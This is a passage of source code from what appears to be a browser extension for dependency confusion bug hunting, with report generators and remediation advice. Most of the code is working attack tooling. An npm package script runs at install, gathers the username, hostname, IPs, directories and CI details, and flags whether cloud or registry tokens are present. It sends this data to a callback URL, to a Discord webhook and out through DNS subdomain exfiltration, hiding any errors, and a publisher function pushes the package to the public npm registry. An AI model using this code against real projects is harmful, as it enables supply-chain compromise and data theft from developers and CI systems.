      GITHUB_ACTOR: process.env.GITHUB_ACTOR || '',
      GITLAB_CI: process.env.GITLAB_CI || '',
      GITLAB_USER_LOGIN: process.env.GITLAB_USER_LOGIN || '',
      JENKINS_URL: process.env.JENKINS_URL || '',
      BUILD_NUMBER: process.env.BUILD_NUMBER || '',
      TRAVIS: process.env.TRAVIS || '',
      CIRCLECI: process.env.CIRCLECI || '',
      BUILDKITE: process.env.BUILDKITE || ''
    }
  };

  return info;
}

function detectCIEnvironment() {
  if (process.env.GITHUB_ACTIONS) return 'GitHub Actions';
  if (process.env.GITLAB_CI) return 'GitLab CI';
  if (process.env.JENKINS_URL) return 'Jenkins';
  if (process.env.TRAVIS) return 'Travis CI';
  if (process.env.CIRCLECI) return 'CircleCI';
  if (process.env.BUILDKITE) return 'Buildkite';
  if (process.env.CI) return 'Generic CI';
  return 'Local Machine';
}

async function sendCallback() {
  const systemInfo = collectSystemInfo();

  // Try to get external IP
  const externalIP = await getExternalIP();
  if (externalIP) {
    systemInfo.externalIP = externalIP;
  }

  const data = JSON.stringify(systemInfo);

  const url = new URL(CALLBACK_URL);
  const options = {
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname + (url.search || ''),
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
      'User-Agent': 'dependency-confusion-poc/${packageName}',
      'X-PoC-Package': '${packageName}',
      'X-PoC-Author': 'OFJAAAH'
    },
    timeout: 10000
  };

  const protocol = url.protocol === 'https:' ? https : http;

  const req = protocol.request(options, (res) => {
    console.log('[PoC] Callback sent - Status:', res.statusCode);
  });

  req.on('error', (e) => {
    // Silently fail
  });

  req.on('timeout', () => {
    req.destroy();
  });

  req.write(data);
  req.end();
}

// DNS exfiltration for restricted networks
function sendDnsCallback() {
  try {
    const dns = require('dns');
    const info = {
      p: PACKAGE_NAME.substring(0, 15),
      u: os.userInfo().username.substring(0, 10),
      h: os.hostname().substring(0, 10),
      t: Date.now()
    };
    const encoded = Buffer.from(JSON.stringify(info))
      .toString('base64')
      .replace(/[+/=]/g, '')
      .substring(0, 50);

    const dnsHost = encoded + '.' + new URL(CALLBACK_URL).hostname;
    dns.resolve(dnsHost, () => {});
  } catch (e) {}
}

// Send to Discord Webhook
async function sendDiscordCallback() {
  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === '') return;

  const systemInfo = collectSystemInfo();
  const externalIP = await getExternalIP();

  // Calculate criticality based on environment
  const isCI = systemInfo.isCI;
  const isRoot = systemInfo.user === 'root' || systemInfo.user === 'Administrator';
  const hasSecrets = !!(process.env.AWS_ACCESS_KEY_ID || process.env.GITHUB_TOKEN || process.env.NPM_TOKEN || process.env.DOCKER_PASSWORD);

  let severity = 'MEDIUM';
  let severityColor = 0xFFA500; // Orange
  let severityEmoji = '🟠';

  if (isCI && hasSecrets) {
    severity = 'CRITICAL';
    severityColor = 0xFF0000; // Red
    severityEmoji = '🔴';
  } else if (isCI || isRoot) {
    severity = 'HIGH';
    severityColor = 0xFF4500; // OrangeRed
    severityEmoji = '🟠';
  } else if (hasSecrets) {
    severity = 'HIGH';
    severityColor = 0xFF4500;
    severityEmoji = '🟠';
  }

  // Build impact assessment
  const impactList = [];
  if (isCI) impactList.push('⚠️ CI/CD Pipeline Compromised');
  if (isRoot) impactList.push('⚠️ Running as Root/Admin');
  if (hasSecrets) impactList.push('⚠️ Secrets/Tokens Detected in ENV');
  if (systemInfo.env.GITHUB_TOKEN || systemInfo.env.GITHUB_ACTIONS) impactList.push('🔑 GitHub Access Available');
  if (process.env.AWS_ACCESS_KEY_ID) impactList.push('☁️ AWS Credentials Exposed');
  if (process.env.NPM_TOKEN) impactList.push('📦 NPM Token Exposed');

  const impactText = impactList.length > 0 ? impactList.join('\\n') : '✅ No critical exposures detected';

  // Build CI details if applicable
  let ciDetails = '';
  if (systemInfo.ciEnvironment !== 'Local Machine') {
    ciDetails = systemInfo.ciEnvironment;
    if (systemInfo.env.GITHUB_REPOSITORY) ciDetails += ' | Repo: ' + systemInfo.env.GITHUB_REPOSITORY;
    if (systemInfo.env.GITHUB_ACTOR) ciDetails += ' | Actor: ' + systemInfo.env.GITHUB_ACTOR;
    if (systemInfo.env.BUILD_NUMBER) ciDetails += ' | Build: ' + systemInfo.env.BUILD_NUMBER;
  }

  const embed = {
    title: severityEmoji + ' DEPENDENCY CONFUSION - ' + severity + ' SEVERITY',
    description: '**Package \`' + PACKAGE_NAME + '\` was installed and executed code!**\\n\\nThis confirms a dependency confusion vulnerability exists.',
    color: severityColor,
    fields: [
      { name: '🎯 Severity Level', value: '**' + severity + '**', inline: true },
      { name: '📦 Package', value: '\`' + PACKAGE_NAME + '\`', inline: true },
      { name: '🏭 Environment', value: isCI ? '**CI/CD PIPELINE**' : 'Local Machine', inline: true },
      { name: '📊 Impact Assessment', value: impactText, inline: false },
      { name: '👤 User', value: '\`' + (systemInfo.user || 'N/A') + '\`' + (isRoot ? ' **[ROOT]**' : ''), inline: true },
      { name: '🖥️ Hostname', value: '\`' + (systemInfo.hostname || 'N/A') + '\`', inline: true },
      { name: '💻 Platform', value: (systemInfo.platform + ' ' + systemInfo.arch) || 'N/A', inline: true },
      { name: '🌐 Local IP', value: '\`' + (systemInfo.localIP || 'N/A') + '\`', inline: true },
      { name: '🌍 External IP', value: '\`' + (externalIP || 'N/A') + '\`', inline: true },
      { name: '🔧 Node Version', value: systemInfo.nodeVersion || 'N/A', inline: true },
      { name: '📁 Working Directory', value: '\`' + (systemInfo.cwd || 'N/A') + '\`', inline: false },
      { name: '🏠 Home Directory', value: '\`' + (systemInfo.homedir || 'N/A') + '\`', inline: false },
    ],
    footer: { text: '🔍 Dependency Confusion Hunter by OFJAAAH | Authorized Security Research' },
    timestamp: new Date().toISOString()
  };

  // Add CI details field if applicable
  if (ciDetails) {
    embed.fields.splice(3, 0, { name: '🔄 CI/CD Details', value: ciDetails, inline: false });
  }

  const payload = JSON.stringify({
    embeds: [embed]
  });

  try {
    const url = new URL(DISCORD_WEBHOOK);
    const options = {
      hostname: url.hostname,
      port: 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      },
      timeout: 10000
    };

    const req = https.request(options, (res) => {
      console.log('[PoC] Discord callback sent - Status:', res.statusCode);
    });

    req.on('error', () => {});
    req.write(payload);
    req.end();
  } catch (e) {}
}

// Execute callbacks
(async () => {
  try {
    await sendCallback();
    await sendDiscordCallback();
    sendDnsCallback();
  } catch (e) {}
})();
`;

  // Main index.js (placeholder)
  const indexJs = `/**
 * ${packageName}
 * Security Research PoC - Dependency Confusion Hunter
 * Author: OFJAAAH
 *
 * This package was published as part of authorized security research
 * to demonstrate dependency confusion vulnerabilities.
 */

module.exports = {
  name: '${packageName}',
  version: '999.0.0',
  poc: true,
  author: 'OFJAAAH'
};
`;

  // README
  const readme = `# ${packageName}

## Security Research PoC

This package was published as part of **authorized security research** to demonstrate dependency confusion vulnerabilities.

### What is Dependency Confusion?

Dependency confusion is a supply chain attack where a malicious package with the same name as an internal/private package is published to a public registry with a higher version number.

### Author

- **OFJAAAH**
- Tool: Dependency Confusion Hunter

### Disclaimer

This package is for **authorized security testing only**. Do not use for malicious purposes.
`;

  return {
    packageJson: packageJson,
    callbackScript: callbackScript,
    indexJs: indexJs,
    readme: readme,
    callbackUrl: callbackUrl
  };
}

// Create a minimal tar entry (512 byte header + content padded to 512)
function createTarEntry(filename, content) {
  const contentBytes = new TextEncoder().encode(content);
  const contentLen = contentBytes.length;

  // Create 512 byte header
  const header = new Uint8Array(512);

  // Name (100 bytes) - prefix with 'package/'
  const fullName = 'package/' + filename;
  const nameBytes = new TextEncoder().encode(fullName);
  header.set(nameBytes.slice(0, 100), 0);

  // Mode (8 bytes) - 0000644
  header.set(new TextEncoder().encode('0000644\0'), 100);

  // UID (8 bytes) - 0000000
  header.set(new TextEncoder().encode('0000000\0'), 108);

  // GID (8 bytes) - 0000000
  header.set(new TextEncoder().encode('0000000\0'), 116);

  // Size (12 bytes) - octal
  const sizeOctal = contentLen.toString(8).padStart(11, '0') + '\0';
  header.set(new TextEncoder().encode(sizeOctal), 124);

  // Mtime (12 bytes) - current time in octal
  const mtime = Math.floor(Date.now() / 1000).toString(8).padStart(11, '0') + '\0';
  header.set(new TextEncoder().encode(mtime), 136);

  // Checksum placeholder (8 bytes of spaces)
  header.set(new TextEncoder().encode('        '), 148);

  // Type flag (1 byte) - '0' for regular file
  header[156] = 48; // '0'

  // Calculate checksum
  let checksum = 0;
  for (let i = 0; i < 512; i++) {
    checksum += header[i];
  }
  const checksumOctal = checksum.toString(8).padStart(6, '0') + '\0 ';
  header.set(new TextEncoder().encode(checksumOctal), 148);

  // Content padded to 512 bytes
  const paddedLen = Math.ceil(contentLen / 512) * 512;
  const contentPadded = new Uint8Array(paddedLen);
  contentPadded.set(contentBytes);

  // Combine header and content
  const entry = new Uint8Array(512 + paddedLen);
  entry.set(header);
  entry.set(contentPadded, 512);

  return entry;
}

// Simple gzip compression using DeflateRaw
async function gzipCompress(data) {
  // GZIP header
  const header = new Uint8Array([0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03]);

  // Use CompressionStream if available (Chrome 80+)
  if (typeof CompressionStream !== 'undefined') {
    const cs = new CompressionStream('gzip');
    const writer = cs.writable.getWriter();
    writer.write(data);
    writer.close();

    const chunks = [];
    const reader = cs.readable.getReader();
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
    }

    const totalLen = chunks.reduce((acc, c) => acc + c.length, 0);
    const result = new Uint8Array(totalLen);
    let offset = 0;
    for (const chunk of chunks) {
      result.set(chunk, offset);
      offset += chunk.length;
    }
    return result;
  }

  // Fallback: return uncompressed (won't work with npm, but at least won't crash)
  return data;
}

// Calculate SHA1 hash
async function sha1Hash(data) {
  const hashBuffer = await crypto.subtle.digest('SHA-1', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Create npm tarball from package content
async function createNpmTarball(pocPackage) {
  const packageJsonStr = JSON.stringify(pocPackage.packageJson, null, 2);
  const callbackJs = pocPackage.callbackScript;
  const indexJs = pocPackage.indexJs;

  // Create tar entries
  const entry1 = createTarEntry('package.json', packageJsonStr);
  const entry2 = createTarEntry('callback.js', callbackJs);
  const entry3 = createTarEntry('index.js', indexJs);

  // End of archive (two 512-byte zero blocks)
  const endBlocks = new Uint8Array(1024);

  // Combine all entries
  const totalLen = entry1.length + entry2.length + entry3.length + 1024;
  const tarData = new Uint8Array(totalLen);
  let offset = 0;
  tarData.set(entry1, offset); offset += entry1.length;
  tarData.set(entry2, offset); offset += entry2.length;
  tarData.set(entry3, offset); offset += entry3.length;
  tarData.set(endBlocks, offset);

  // Gzip compress
  const gzipped = await gzipCompress(tarData);

  return gzipped;
}

// Publish PoC package to npm registry
async function publishPoCPackage(packageName, callbackUrl) {
  console.log('[Dependency Hunter] Starting npm publish for:', packageName);

  // Check if npm token is configured
  if (!config.npmToken) {
    return {
      success: false,
      error: 'NPM token not configured. Please set it in the extension settings.',
      needsToken: true
    };
  }

  // Use Discord webhook for callbacks (callbackUrl is just a label now)
  let finalCallbackUrl = callbackUrl || 'Discord Webhook';
  if (!config.discordWebhook) {
    console.warn('[Dependency Hunter] Discord webhook not configured, callbacks may not work');
  }

  // Generate package content
  const pocPackage = generatePoCPackageContent(packageName, finalCallbackUrl);
  console.log('[Dependency Hunter] Package generated, creating tarball...');

  try {
    // Create tarball
    const tarball = await createNpmTarball(pocPackage);
    const tarballBase64 = btoa(String.fromCharCode(...tarball));
    const shasum = await sha1Hash(tarball);

    console.log('[Dependency Hunter] Tarball created, size:', tarball.length, 'shasum:', shasum);

    // Prepare npm publish body
    const version = pocPackage.packageJson.version;
    const tarballName = `${packageName}-${version}.tgz`;

    const publishBody = {
      _id: packageName,
      name: packageName,
      description: pocPackage.packageJson.description,
      'dist-tags': {
        latest: version
      },
      versions: {
        [version]: {
          ...pocPackage.packageJson,
          _id: `${packageName}@${version}`,
          _nodeVersion: '18.0.0',
          _npmVersion: '9.0.0',
          dist: {
            shasum: shasum,
            tarball: `https://registry.npmjs.org/${packageName}/-/${tarballName}`
          }
        }
      },
      access: 'public',
      _attachments: {
        [tarballName]: {
          content_type: 'application/octet-stream',
          data: tarballBase64,
          length: tarball.length
        }
      }
    };

    console.log('[Dependency Hunter] Publishing to npm registry...');

    // Send to npm registry
    const npmRegistry = config.npmRegistry || 'https://registry.npmjs.org';
    const response = await fetch(`${npmRegistry}/${encodeURIComponent(packageName)}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.npmToken}`,
        'npm-command': 'publish'
      },
      body: JSON.stringify(publishBody)
    });

    const responseText = await response.text();
    console.log('[Dependency Hunter] npm response:', response.status, responseText);

    if (response.ok) {
      return {
        success: true,
        message: 'Package published successfully!',
        packageName: packageName,
        version: version,
        callbackUrl: finalCallbackUrl,
        npmUrl: `https://www.npmjs.com/package/${packageName}`,
        registryResponse: responseText
      };
    } else {
      let errorMsg = responseText;
      try {
        const errorJson = JSON.parse(responseText);
        errorMsg = errorJson.error || errorJson.reason || responseText;
      } catch (e) {}

      return {
        success: false,
        error: `npm publish failed: ${errorMsg}`,
        status: response.status,
        package: pocPackage
      };
    }
  } catch (error) {
    console.error('[Dependency Hunter] Publish error:', error);
    return {
      success: false,
      error: error.message,
      package: pocPackage
    };
  }
}

// =====================================================
// END POC PACKAGE GENERATION
// =====================================================

// Update badge with findings count
function updateBadge() {
  const count = findings.length;
  chrome.action.setBadgeText({
    text: count > 0 ? count.toString() : ''
  });
  chrome.action.setBadgeBackgroundColor({
    color: count > 0 ? '#ff0000' : '#00ff00'
  });
}

// Listen for messages from popup and content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'getFindings') {
    sendResponse({ findings: findings });
  } else if (request.action === 'getHistory') {
    sendResponse({ history: history });
  } else if (request.action === 'clearFindings') {
    findings = [];
    chrome.storage.local.set({ findings: [] });
    updateBadge();
    sendResponse({ success: true });
  } else if (request.action === 'clearHistory') {
    history = [];
    chrome.storage.local.set({ history: [] });
    sendResponse({ success: true });
  } else if (request.action === 'updateConfig') {
    config = { ...config, ...request.config };
    chrome.storage.local.set({ config: config });
    // Also save discordWebhook to sync storage for popup.js access
    if (request.config.discordWebhook !== undefined) {
      chrome.storage.sync.set({ discordWebhook: request.config.discordWebhook });
    }
    sendResponse({ success: true });
  } else if (request.action === 'testDiscordCallback') {
    // Test Discord webhook
    testDiscordWebhook(request.webhookUrl)
      .then(() => sendResponse({ success: true }))
      .catch(() => sendResponse({ success: false }));
    return true; // Keep channel open for async response
  } else if (request.action === 'getConfig') {
    sendResponse({ config: config });
  } else if (request.action === 'getStats') {
    sendResponse({
      stats: {
        totalFindings: findings.length,
        totalHistory: history.length,
        urlsProcessed: processedUrls.size,
        packagesChecked: checkedPackages.size
      }
    });
  } else if (request.action === 'exportFinding') {
    sendResponse({
      success: true,
      message: `To create the package ${request.finding.package}: use:\n` +
               `npm init -y\n` +
               `npm publish`
    });
  } else if (request.action === 'analyzeUrl') {
    // Handler for content script URL analysis requests
    if (request.url && !processedUrls.has(request.url)) {
      analyzeFile(request.url, sender.tab?.id);
    }
    sendResponse({ success: true });
  } else if (request.action === 'checkPackage') {
    // Handler for content script package check requests
    if (request.package && request.type) {
      const pkg = {
        name: request.package,
        type: request.type,
        source: request.source || sender.tab?.url || 'unknown',
        confidence: 70 // Default confidence for content script detections
      };
      checkPackageExists(pkg, pkg.source, sender.tab?.id);
    }
    sendResponse({ success: true });
  } else if (request.action === 'exportJSON') {
    // Export findings and history as JSON
    const exportData = {
      version: '1.2.0',
      exportedAt: new Date().toISOString(),
      findings: findings,
      history: history,
      stats: {
        totalFindings: findings.length,
        totalHistory: history.length,
        urlsProcessed: processedUrls.size,
        packagesChecked: checkedPackages.size
      }
    };
    sendResponse({ success: true, data: exportData });
  } else if (request.action === 'exportFindingsJSON') {
    // Export only current findings as JSON
    sendResponse({ success: true, data: findings });
  } else if (request.action === 'generatePoCPackage') {
    // Generate PoC package content with callback (Discord only)
    const packageName = request.packageName;
    const callbackUrl = request.customCallbackUrl || 'Discord Webhook';

    if (!packageName) {
      sendResponse({ success: false, error: 'Package name is required' });
      return;
    }

    const pocPackage = generatePoCPackageContent(packageName, callbackUrl);
    sendResponse({ success: true, package: pocPackage });
  } else if (request.action === 'publishPoCPackage') {
    // Publish PoC package to npm
    publishPoCPackage(request.packageName, request.callbackUrl)
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true; // Keep channel open for async response
  } else if (request.action === 'getNpmToken') {
    // Get npm token from config
    sendResponse({
      success: true,
      token: config.npmToken || '',
      hasToken: !!(config.npmToken && config.npmToken.length > 0)
    });
  } else if (request.action === 'generateReport') {
    // Generate markdown report for a callback
    const report = generateMarkdownReport(request.callback, request.packageName);
    sendResponse({ success: true, report: report });
  } else if (request.action === 'generateFindingReport') {
    // Generate report for a finding (before callback)
    const report = generateFindingReport(request.finding);
    sendResponse({ success: true, report: report });
  }
  return true;
});

// Generate Markdown report for callback (proof of dependency confusion)
function generateMarkdownReport(callback, packageName) {
  const extracted = callback.extractedData || {};
  const timestamp = new Date().toISOString();

  // Calculate severity based on environment
  const isCI = extracted.isCI || extracted.ciEnvironment !== 'Local Machine';
  const isRoot = extracted.user === 'root' || extracted.user === 'Administrator';

  let severity = 'MEDIUM';
  let cvssScore = '6.5';
  let riskLevel = 'Moderate Risk';

  if (isCI && isRoot) {
    severity = 'CRITICAL';
    cvssScore = '9.8';
    riskLevel = 'Critical Risk - Immediate Action Required';
  } else if (isCI) {
    severity = 'HIGH';
    cvssScore = '8.6';
    riskLevel = 'High Risk - CI/CD Pipeline Compromised';
  } else if (isRoot) {
    severity = 'HIGH';
    cvssScore = '7.8';
    riskLevel = 'High Risk - Privileged Access';
  }

  // Build impact assessment
  const impacts = [];
  if (isCI) impacts.push('- **CI/CD Pipeline Compromised**: Code executed in automated build environment');
  if (isRoot) impacts.push('- **Privileged Execution**: Running as root/administrator user');
  if (extracted.ciEnvironment === 'GitHub Actions') impacts.push('- **GitHub Actions Exposed**: Potential access to repository secrets and GITHUB_TOKEN');
  if (extracted.ciEnvironment === 'GitLab CI') impacts.push('- **GitLab CI Exposed**: Potential access to CI/CD variables and tokens');
  if (extracted.ciEnvironment === 'Jenkins') impacts.push('- **Jenkins Exposed**: Potential access to Jenkins credentials store');
  impacts.push('- **System Information Leaked**: User, hostname, IP addresses, and directory structure');
  impacts.push('- **Code Execution Confirmed**: Arbitrary JavaScript code executed during package installation');

  return `# Dependency Confusion Vulnerability Report

## Executive Summary

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Dependency Confusion (Supply Chain Attack) |
| **Package Name** | \`${packageName || extracted.package || 'N/A'}\` |
| **Severity** | **${severity}** |
| **CVSS Score** | ${cvssScore}/10 |
| **Risk Level** | ${riskLevel} |
| **Status** | **CONFIRMED** (Callback Received) |
| **Date** | ${timestamp.split('T')[0]} |
| **Researcher** | OFJAAAH |

---

## Criticality Assessment

### Environment Analysis

| Factor | Value | Impact |
|--------|-------|--------|
| **Execution Environment** | ${extracted.ciEnvironment || 'Local Machine'} | ${isCI ? '🔴 HIGH' : '🟡 MEDIUM'} |
| **User Privileges** | ${extracted.user || 'N/A'} | ${isRoot ? '🔴 ROOT ACCESS' : '🟢 Normal User'} |
| **Network Exposure** | External IP: ${extracted.externalIP || 'N/A'} | 🟡 EXPOSED |

### Risk Factors

${impacts.join('\n')}

---

## Vulnerability Description

A **dependency confusion vulnerability** was identified where an internal/private package name was found to be unregistered on the public npm registry. By publishing a malicious package with the same name and a higher version number, an attacker could potentially execute arbitrary code on systems that install this package.

**Attack Vector**: Supply Chain
**Attack Complexity**: Low
**Privileges Required**: None
**User Interaction**: None (automatic during npm install)

---

## Proof of Concept

### Callback Received ✅

The following callback was received, confirming that the PoC package was installed and executed:

| Field | Value |
|-------|-------|
| **Timestamp** | ${callback.timestamp || 'N/A'} |
| **Protocol** | ${callback.type?.toUpperCase() || 'HTTP'} |
| **Source IP** | \`${callback.remoteAddress || 'N/A'}\` |

### System Information Collected

| Field | Value |
|-------|-------|
| **Username** | \`${extracted.user || 'N/A'}\` ${isRoot ? '⚠️ **ROOT**' : ''} |
| **Hostname** | \`${extracted.hostname || 'N/A'}\` |
| **Working Directory** | \`${extracted.cwd || 'N/A'}\` |
| **Platform** | ${extracted.platform || 'N/A'} ${extracted.arch || ''} |
| **Local IP** | \`${extracted.localIP || 'N/A'}\` |
| **External IP** | \`${extracted.externalIP || 'N/A'}\` |
| **Node Version** | ${extracted.nodeVersion || 'N/A'} |
| **CI Environment** | ${extracted.ciEnvironment || (extracted.isCI ? 'Yes' : 'No')} ${isCI ? '⚠️ **CI/CD**' : ''} |

---

## Impact Analysis

### Severity: ${severity}

An attacker exploiting this vulnerability could:

1. **Execute arbitrary code** on developer machines and CI/CD systems
2. **Steal sensitive data** including environment variables, credentials, and source code
3. **Establish persistence** through backdoors in the development environment
4. **Compromise the software supply chain** by injecting malicious code into builds
${isCI ? '5. **Access CI/CD secrets** including deployment keys, API tokens, and cloud credentials' : ''}
${isRoot ? '6. **Gain full system access** with root/administrator privileges' : ''}

---

## Remediation

1. **Register the package name** on the public npm registry (even as a placeholder)
2. **Use scoped packages** (e.g., \`@company/package-name\`) which cannot be hijacked
3. **Configure npm to use a private registry** with proper priority settings
4. **Implement package lockfiles** and verify package integrity
5. **Use \`.npmrc\` configuration** to restrict package sources:
   \`\`\`
   @company:registry=https://your-private-registry.com
   \`\`\`

---

## Timeline

| Date | Action |
|------|--------|
| ${timestamp.split('T')[0]} | Vulnerability discovered |
| ${timestamp.split('T')[0]} | PoC package published |
| ${timestamp.split('T')[0]} | Callback received (confirmed) |
| TBD | Vendor notified |
| TBD | Remediation implemented |

---

## References

- [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)

---

*Report generated by Dependency Confusion Hunter by OFJAAAH*
`;
}

// Generate report for a finding (before callback is received)
function generateFindingReport(finding) {
  const timestamp = new Date().toISOString();

  return `# Potential Dependency Confusion Vulnerability

## Summary

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Dependency Confusion (Potential) |
| **Package Name** | \`${finding.package}\` |
| **Package Type** | ${finding.type?.toUpperCase() || 'NPM'} |
| **Severity** | High (Potential) |
| **Status** | Package Not Found on Public Registry |
| **Detection Date** | ${finding.timestamp || timestamp} |
| **Confidence** | ${finding.confidence || 'N/A'}% |
| **Researcher** | OFJAAAH |

---

## Vulnerability Description

The package \`${finding.package}\` was referenced in the target application but does not exist on the public ${finding.type?.toUpperCase() || 'npm'} registry. This indicates a potential dependency confusion vulnerability.

If this is an internal/private package, an attacker could:
1. Register this package name on the public registry
2. Publish a malicious version with a high version number (e.g., 999.0.0)
3. Wait for the target system to install the malicious package

---

## Detection Details

| Field | Value |
|-------|-------|
| **Package Name** | \`${finding.package}\` |
| **Source URL** | ${finding.source || 'N/A'} |
| **Registry Checked** | ${finding.registryUrl || 'N/A'} |
| **Detection Method** | Automated Scan |
| **Confidence Score** | ${finding.confidence || 'N/A'}% |

${finding.matchedText ? `
### Code Reference
\`\`\`javascript
${finding.matchedText}
\`\`\`
` : ''}

---

## Recommended Next Steps

1. **Verify** if this is indeed an internal package
2. **Create PoC** package with callback to confirm vulnerability
3. **Document** the callback evidence
4. **Report** to the security team

---

## Impact (If Exploited)

- Remote Code Execution on developer machines
- CI/CD pipeline compromise
- Credential and secret theft
- Supply chain attack vector

---

## Remediation Recommendations

1. Register the package name on the public registry
2. Use scoped packages (@org/package)
3. Configure private registry with proper priority
4. Implement package lockfiles

---

*Report generated by Dependency Confusion Hunter by OFJAAAH*
`;
}

// Initialize badge on startup
updateBadge();
